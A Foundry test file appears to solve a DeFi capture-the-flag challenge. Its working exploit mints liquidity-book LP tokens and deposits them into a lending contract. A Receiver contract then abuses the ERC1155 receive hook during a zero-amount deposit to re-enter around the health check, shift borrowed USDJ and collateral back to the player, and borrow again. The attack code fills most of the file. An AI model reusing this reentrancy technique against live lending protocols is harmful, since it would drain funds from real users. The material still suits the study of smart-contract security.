// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import "../src/Challenge.sol";
import {BinHelper} from "@trader-joe/libraries/BinHelper.sol";
import {PackedUint128Math} from "@trader-joe/libraries/math/PackedUint128Math.sol";
import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

contract CounterTest is Test {
    Challenge public challenge;

    using BinHelper for bytes32;
    using PackedUint128Math for bytes32;
    using PackedUint128Math for uint128;

    address public constant DAI_ORACLE = 0xAed0c38402a5d19df6E4c03F4E2DceD6e29c1ee9;
    address public constant USDC_ORACLE = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;
    address public constant USDT_ORACLE = 0x3E7d1eAB13ad0104d2750B8863b489D65364e32D;

    ERC20 public USDC;
    ERC20 public USDT;
    ERC20 public USDJ;

    LBFactory public LB_FACTORY;
    LBPair public LB_PAIR_IMPL;
    ILBPair public PAIR;
    JoeLending public JOE_LENDING;
    uint256 pairId;

    address public player = address(0x1111);
    uint256 originalLiquidityBalance;

    function setUp() public {
        vm.rollFork(21641964);
        challenge = new Challenge(address(player));
        USDC = challenge.USDC();
        USDT = challenge.USDT();
        USDJ = challenge.USDJ();
        LB_FACTORY = challenge.LB_FACTORY();
        LB_PAIR_IMPL = challenge.LB_PAIR_IMPL();
        PAIR = challenge.PAIR_USDT_USDC();
        JOE_LENDING = challenge.JOE_LENDING();

        pairId = PAIR.getActiveId();

        // console.log("USDC: ", address(USDC));
        // console.log("USDT: ", address(USDT));
        // console.log("USDJ: ", address(USDJ));
        // console.log("LB_FACTORY: ", address(LB_FACTORY));
        // console.log("LB_PAIR_IMPL: ", address(LB_PAIR_IMPL));
        // console.log("PAIR: ", address(PAIR));
        // console.log("JOE_LENDING: ", address(JOE_LENDING));
        // console.log("pairId: ", pairId);
    }

    function testSolve() public {
        vm.startPrank(player);
        USDC.approve(address(PAIR), type(uint256).max);
        USDT.approve(address(PAIR), type(uint256).max);

        // console.log("health %e", JOE_LENDING.getHealthFactor(address(challenge)));
        // (uint128 amountIn, uint128 amountOutLeft, uint128 fee) = PAIR.getSwapIn(500e6, true);
        // console.log("SwapIn: %e, %e, %e", amountIn, amountOutLeft, fee);

        // we get LP token.deposit into Joe and borrow against it.
        mintLiquidity();
        // deposit();

        console.log("USDC balance: ", USDC.balanceOf(player));
        console.log("USDT balance: ", USDT.balanceOf(player));


        console.log("new receiver");
        Receiver receiver = new Receiver(PAIR, JOE_LENDING, USDJ, player);
        PAIR.approveForAll(address(receiver), true);
        JOE_LENDING.setApprovalForAll(address(this), true);

        console.log("deposit");
        receiver.deposit();
        console.log("borrowing");
        receiver.borrowMax();
        console.log("depositZero");
        receiver.depositZero();

        console.log("ReceiverHealth: %e", JOE_LENDING.getHealthFactor(address(receiver)));        
        console.log("USDJ balance: %e", USDJ.balanceOf(player));        
        console.log("JOE_LENDING balance: %e", JOE_LENDING.balanceOf(address(player), pairId));
        console.log("health %e", JOE_LENDING.getHealthFactor(address(challenge)));
        console.log("borrowable %e", JOE_LENDING.getUserBorrowableAmount(player, pairId));

        deposit();//deposit zero amount to register collateral
        // borrow();. cannot borrow more due to _totalLb = 0
        // must redeem into LP
        withdraw();
        //then deposit back to get more LP token
        deposit();
        borrow();

        //after this player got lots of USDJ and original LP token under JOE lending
        // receiver health become zero. so we can liquidate them. by repaying original USDJ


        console.log("USDJ balance: %e", USDJ.balanceOf(player));

        require(challenge.isSolved(), "not solved");
    }

    function swapToUSDT(uint256 amount) internal {
        // Swap USDC to USDT
        USDC.transfer(address(PAIR), amount);
        PAIR.swap(false, player);
    }

    function swapToUSDC(uint256 amount) internal {
        // Swap USDT to USDC
        USDT.transfer(address(PAIR), amount);
        PAIR.swap(true, player);
    }

    function mintLiquidity() internal {
        USDC.transfer(address(PAIR), USDC.balanceOf(player));
        USDT.transfer(address(PAIR), USDT.balanceOf(player));
        // Mint liquidity
        bytes32[] memory liquidityConfig = new bytes32[](1);
        liquidityConfig[0] = LiquidityConfigurations.encodeParams(1e18, 1e18, uint24(pairId));
        PAIR.mint(player, liquidityConfig, player);

        uint256 beforeLiquidity = PAIR.balanceOf(player, pairId);
        originalLiquidityBalance = beforeLiquidity;
    }

    function deposit() internal {
        uint256[] memory ids = new uint256[](1);
        ids[0] = pairId;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = PAIR.balanceOf(player, pairId);
        PAIR.approveForAll(address(JOE_LENDING), true);
        JOE_LENDING.deposit(ids, amounts);
    }

    function spamDeposit() internal {
        USDC.transfer(address(PAIR), 1e4);
        USDT.transfer(address(PAIR), 1e4);
        // Mint liquidity
        bytes32[] memory liquidityConfig = new bytes32[](1);
        liquidityConfig[0] = LiquidityConfigurations.encodeParams(1e18, 1e18, uint24(pairId));
        PAIR.mint(player, liquidityConfig, player);

        //spam
        uint256 spamCount = 10;
        uint256[] memory ids = new uint256[](spamCount);
        uint256[] memory amounts = new uint256[](spamCount);
        for (uint256 i = 0; i < spamCount; i++) {
            ids[i] = pairId;
            amounts[i] = 1e1;
        }

        PAIR.approveForAll(address(JOE_LENDING), true);

        for (uint256 i = 0; i < 2; i++) {
            JOE_LENDING.deposit(ids, amounts);
        }
    }

    function burn() internal {
        uint256 liquidity = PAIR.balanceOf(player, pairId);
        uint256[] memory ids = new uint256[](1);
        ids[0] = pairId;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = liquidity;
        PAIR.burn(player, player, ids, amounts);
    }

    function spamBurn() internal {
        uint256 count = 100;
        uint256[] memory ids = new uint256[](count);
        uint256[] memory amounts = new uint256[](count);
        for (uint256 i = 0; i < count; i++) {
            ids[i] = pairId;
            amounts[i] = 1e1;
        }
        PAIR.approveForAll(address(JOE_LENDING), true);
        JOE_LENDING.burn(ids, amounts);
    }

    function withdraw() internal {
        uint256[] memory ids = new uint256[](1);
        ids[0] = pairId;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = JOE_LENDING.balanceOf(player, pairId);
        JOE_LENDING.burn(ids, amounts);
    }

    function redeemMax() internal {
        uint256[] memory ids = new uint256[](1);
        ids[0] = pairId;
        uint256[] memory amounts = new uint256[](1);

        uint256 maxOut = JOE_LENDING._totalLb(pairId);
        amounts[0] = JOE_LENDING.balanceOf(player, pairId);

        JOE_LENDING.sync(player, pairId);
        // we need token out enough to pass hypothetical healthcheck for 90%
        // uint256 exchangeRate = _getExchangeRateMantissa(pairId); //exchangeRate = 0.2e18
        //sumBorrowPlusEffects = maxBorrow
        uint256 tokenOut = maxOut * 1e18 / _getExchangeRateMantissa(pairId);
        uint256 maxBorrow = (
            _getLiquidityValueMantissa(pairId, PAIR.totalSupply(pairId)) / PAIR.totalSupply(pairId)
                * _getExchangeRateMantissa(pairId) * tokenOut / 1e18
        ) * 0.8e18 / 1e18;

        // (
        //     _getLiquidityValueMantissa(pairId, PAIR.totalSupply(pairId)) / PAIR.totalSupply(pairId) * exchangeRate
        //         * maxOut / 1e18
        // ) * 0.8e18 / 1e18;
        console.log("maxBorrow: %e", maxBorrow);

        JOE_LENDING.burn(ids, amounts);
    }

    function _getLiquidityValueMantissa(uint256 id, uint256 amount)
        internal
        view
        returns (uint256 reserveWorthMantissa)
    {
        (uint128 x, uint128 y) = PAIR.getBin(uint24(id));
        bytes32 reserve = x.encode(y);
        reserve = BinHelper.getAmountOutOfBin(reserve, amount, PAIR.totalSupply(id));
        (x, y) = reserve.decode();
        reserveWorthMantissa = (
            (x * getAssetPrice(JOE_LENDING.getTokenX()) * (10 ** 12))
                + (y * getAssetPrice(JOE_LENDING.getTokenY()) * (10 ** 12))
        );
    }

    function getAssetPrice(IERC20 asset) public view returns (uint256) {
        return JOE_LENDING.getAssetPrice(asset);
    }

    function _getExchangeRateMantissa(uint256 id) internal view returns (uint256) {
        uint256 totalSupply = JOE_LENDING._totalSupplies(id);
        if (totalSupply == 0) {
            return 0.2e18;
        } else {
            //@totalLB is pair token liquidity amount. start from 5.83e23,
            uint256 exchangeRateMantissa =
                (JOE_LENDING._totalLb(id) + JOE_LENDING._totalBorrowedLb(id)) * 1e18 / totalSupply; //@reduce exchangeRate is very good.
            return exchangeRateMantissa == 0 ? 0.2e18 : exchangeRateMantissa;
        }
    }

    function borrow() internal {
        uint256[] memory ids = new uint256[](1);
        ids[0] = pairId;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = JOE_LENDING.getUserBorrowableAmount(player, pairId);

        // uint256 tokenOut = JOE_LENDING.balanceOf(player, pairId);
        // uint256 maxCollateral = (
        //     _getLiquidityValueMantissa(pairId, PAIR.totalSupply(pairId)) / PAIR.totalSupply(pairId)
        //         * _getExchangeRateMantissa(pairId) * tokenOut / 1e18
        // ) * 0.8e18 / 1e18;
        // console.log("maxCollateral: %e", maxCollateral);
        // // from max collateral caculate maxBorrow hypothetical to reach minimum health factor
        // uint256 accruedInterest = JOE_LENDING._accruedInterest(player, pairId);
        // console.log("accruedInterest: %e", accruedInterest);
        // uint256 maxBorrow = maxCollateral - accruedInterest;
        // uint256 amountIn = maxBorrow / JOE_LENDING.getAssetPrice(JOE_LENDING.USDJ());
        // console.log("maxBorrow: %e", maxBorrow);
        // console.log("amountIn: %e", amountIn);
        // amounts[0] = amountIn;

        JOE_LENDING.borrow(ids, amounts);
    }

    function spamSmallDeposit() internal {
        PAIR.approveForAll(address(JOE_LENDING), true);
        //spam
        uint256 spamCount = 1000;
        uint256[] memory ids = new uint256[](spamCount);
        uint256[] memory amounts = new uint256[](spamCount);
        for (uint256 i = 0; i < spamCount; i++) {
            ids[i] = pairId;
            amounts[i] = 1e1;
        }

        for (uint256 i = 0; i < 10; i++) {
            JOE_LENDING.deposit(ids, amounts);
        }
    }
}

contract Receiver {
    ILBPair public PAIR;
    JoeLending public JOE_LENDING;
    uint256 pairId;

    ERC20 USDJ;
    address owner;

    constructor(ILBPair _pair, JoeLending _joeLending, ERC20 _usdj, address _owner) {
        PAIR = _pair;
        JOE_LENDING = _joeLending;

        pairId = PAIR.getActiveId();
        USDJ = _usdj;
        owner = _owner;
    }

    function deposit() external {
        uint256[] memory ids = new uint256[](1);
        ids[0] = pairId;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = PAIR.balanceOf(address(msg.sender), pairId);

        PAIR.batchTransferFrom(msg.sender, address(this), ids, amounts);

        amounts[0] = PAIR.balanceOf(address(this), pairId);
        PAIR.approveForAll(address(JOE_LENDING), true);
        JOE_LENDING.deposit(ids, amounts);

        console.log("deposit %e", amounts[0]);
    }

    function depositZero() external {
        uint256[] memory ids = new uint256[](1);
        ids[0] = pairId;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 0;
        JOE_LENDING.deposit(ids, amounts);
        console.log("zeroshot deposit %e", amounts[0]);
    }

    function burn() external {
        uint256[] memory ids = new uint256[](1);
        ids[0] = pairId;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = JOE_LENDING.balanceOf(address(this), pairId);
        amounts[0] = 1;
        JOE_LENDING.redeem(ids, amounts);
        console.log("burn %e", amounts[0]);
    }

    function borrowMax() external {
        uint256[] memory ids = new uint256[](1);
        ids[0] = pairId;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = JOE_LENDING.getUserBorrowableAmount(address(this), pairId);


        JOE_LENDING.borrow(ids, amounts);
        console.log("borrow %e", amounts[0]);
    }

    function onERC1155Received(address operator, address from, uint256 id, uint256 value, bytes calldata data)
        external
        returns (bytes4)
    {
        console.log("onERC1155Received: %d, %d", id, value);
        console.log("from: %s, id: %d, value: %d", from, id, value);

        if (value != 0) {
            return IERC1155Receiver.onERC1155Received.selector;
        }//skip if not minting with zero amount

        //trigger health check reentrancy here.
        //send LP token back to player. and every other token
        console.log("USDJ balance: %e", USDJ.balanceOf(address(this)));
        USDJ.transfer(owner, USDJ.balanceOf(address(this)));

        uint256[] memory ids = new uint256[](1);
        ids[0] = pairId;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = PAIR.balanceOf(address(this), pairId);
        console.log("PAIR balance: %e", PAIR.balanceOf(address(this), pairId));
        PAIR.batchTransferFrom(address(this), owner, new uint256[](1), new uint256[](1));

        console.log("JOE_LENDING balance: %e", JOE_LENDING.balanceOf(address(this), pairId));
        JOE_LENDING.safeTransferFrom(address(this), owner, pairId, JOE_LENDING.balanceOf(address(this), pairId), "");

        return IERC1155Receiver.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(
        address operator,
        address from,
        uint256[] calldata ids,
        uint256[] calldata values,
        bytes calldata data
    ) external returns (bytes4) {
        console.log("onERC1155BatchReceived: %d, %d", ids[0], values[0]);
        console.log("from: %s, id: %d, value: %d", from, ids[0], values[0]);
        return IERC1155Receiver.onERC1155BatchReceived.selector;
    }
}
